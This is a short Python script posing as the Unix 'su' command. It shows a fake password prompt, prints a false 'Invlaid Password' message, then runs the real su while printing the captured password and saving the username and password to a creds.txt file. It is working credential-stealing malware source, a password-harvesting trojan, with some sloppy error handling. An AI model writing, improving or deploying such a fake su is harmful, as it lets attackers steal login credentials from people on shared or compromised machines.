#!/usr/bin/env python
import sys
import getpass
import os
from subprocess import call

def transport_creds(username, password):
    target = open("creds.txt", 'w+')
    target.write("Username: " + username + "\n")
    target.write("Password: " + password)
    target.close()


def gen_arg_list():
    arguments = []
    for arg in sys.argv:
        arguments.append(arg)
    return arguments

def main():
    su_command = ""
    args = gen_arg_list()
    try:
        if args[1] == "-":
            username = args[2]
            pswd = getpass.getpass("Password: ")
            print("Invlaid Password") 
    except ValueError:
        pass 
    
    for arg in args:
        su_command = su_command + " " + arg
    call(["su", "-", args[2]])
    print("The Password Entered was: " + pswd)
    transport_creds(username, pswd)

if __name__ == '__main__':
    main()